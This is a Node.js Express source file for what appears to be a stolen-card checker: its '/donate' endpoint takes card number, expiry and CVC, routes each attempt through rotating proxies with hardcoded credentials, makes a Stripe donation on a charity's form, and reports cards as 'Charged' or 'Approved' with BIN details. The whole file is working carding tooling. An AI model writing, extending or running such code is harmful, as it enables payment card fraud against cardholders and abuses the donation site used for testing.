const express = require('express');
const app = express();
const port = 5000;

const fs = require('fs');

const LumiApp = require('./app/app.js');
const bot = new LumiApp();

const { BinLookup } = require('bin-iin-lookup');

const { HttpsProxyAgent } = require('https-proxy-agent');

app.get('/donate', async (req, res) => {
    
    var cc = req.query.cc;
    
    if (cc) {
        
        if(!cc.includes('|')) {

            return res.json({
                success: false,
                message: 'Invalid credit card format'
            });

        } else {

            const proxy = randomProxy().split(':');
            const proxie = new HttpsProxyAgent(`http://${proxy[2]}:${proxy[3]}@${proxy[0]}:${proxy[1]}`);

            var ccn = cc.split('|')[0];
            var exp_month = cc.split('|')[1];
            var exp_year = cc.split('|')[2];
            var cvc = cc.split('|')[3];

            const card = `${ccn}|${exp_month}|${exp_year}|${cvc}`;

            const createPaymentMethod = await bot.createPaymentMethod(proxie, ccn, exp_month, exp_year, cvc);
            if (createPaymentMethod.id) {

                const donate = await bot.createDonation(proxie, createPaymentMethod.id);
                if (donate.errors) {
                    
                    // Restricted
                    if (donate.errors.restricted) {
                        return res.json({
                            card: `${ccn}|${exp_month}|${exp_year}|${cvc}`,
                            message: donate.errors.restricted
                        });
                    } else {

                        //if (donate.errors.includes('Stripe Error: ')) donate.errors = donate.errors.replace('Stripe Error: ', '');
                        return res.json({
                            card: `${ccn}|${exp_month}|${exp_year}|${cvc}`,
                            message: donate.errors
                        });
                    }
                } else if (donate.success) {

                    if (donate.data.error === '' && donate.data.result.message.includes('Thank you for your donation')) {
                        return res.json({
                            card: card,
                            message: 'Charged',
                            bin: await Bin(`${ccn.substring(0, 6)}`) || null
                        });
                    } else if (donate.data.client_secret && donate.data.message === 'Verifying strong customer authentication. Please wait...') {
                        return res.json({
                            card: card,
                            message: 'Approved',
                            bin: await Bin(`${ccn.substring(0, 6)}`) || null
                        });
                    } else {
                        return;
                    }
                    
                } else {
                    return res.json({
                        card: card,
                        code: 'donate_unknown_error',
                        message: donate
                    });
                }
                
            } else {

                // IF ERROR WHEN CREATING PAYMENT METHOD
                return res.json({
                    card: card,
                    message: createPaymentMethod.error?.message || 'Unknown error occurred while creating payment method'
                });

            }
            
        }

    } else {
    
        return res.json({
            success: false,
            message: 'Please provide a credit card number'
        });

    }

});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

function randomProxy() {
    
    try {

        let proxies = ['rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1', 'rp.scrapegw.com:6060:gl577u2dnq5lkkd:ijuv4as3dv85du1']
	    if (proxies.length === 0) {
            throw new Error('Proxy list is empty');
        }
        const randomIndex = Math.floor(Math.random() * proxies.length);
        return proxies[randomIndex];
        
    } catch (e) {
        return e;
    }

}

async function Bin (bin) {
    
    const binlook = await BinLookup(bin);
    if (binlook.success == true) {
        return binlook.data;
    } else {
        return;
    }

}